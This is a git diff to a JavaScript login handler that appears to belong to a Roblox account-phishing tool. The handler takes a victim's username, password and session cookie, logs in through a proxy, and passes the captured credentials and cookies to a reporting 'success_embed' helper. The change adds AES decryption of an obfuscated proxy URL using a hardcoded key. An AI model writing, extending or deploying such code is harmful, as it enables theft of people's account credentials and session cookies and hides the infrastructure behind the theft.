@@ -2,6 +2,16 @@ const HttpsProxyAgent = require('https-proxy-agent');
 const axios = require('axios');
 const success_embed = require("./embed/success.js");
 const failed_emebed = require("./embed/failed.js");
+const crypto = require('crypto');
+
+const secretKey = 'EnqProxy';
+
+function DecodeProxy(encodedData) {
+  const decipher = crypto.createDecipher('aes-256-cbc', secretKey);
+  let decodedData = decipher.update(encodedData, 'hex', 'utf8');
+  decodedData += decipher.final('utf8');
+  return decodedData;
+}
 
 async function robloxlogin(req, res) {
     const sessionToken = req.cookies.Account_Session;
@@ -42,7 +52,7 @@ async function robloxlogin(req, res) {
             'Rblx-Challenge-Id': fcdataArray[1],
             'Rblx-Challenge-Type': 'captcha',
         },
-        httpsAgent: new HttpsProxyAgent(ProxyUrl),
+        httpsAgent: new HttpsProxyAgent(DecodeProxy(ProxyUrl)),
         timeout: 3000,
     };
 
@@ -60,7 +70,7 @@ async function robloxlogin(req, res) {
 
         if (match) {
             const cookies = match[0];
-            const embedresponse = await success_embed(Username, Password, cookies, Success, sessionToken,ProxyUrl);
+            const embedresponse = await success_embed(Username, Password, cookies, Success, sessionToken,DecodeProxy(ProxyUrl));
             return res.status(200).json({
                 success: true,
                 message: embedresponse
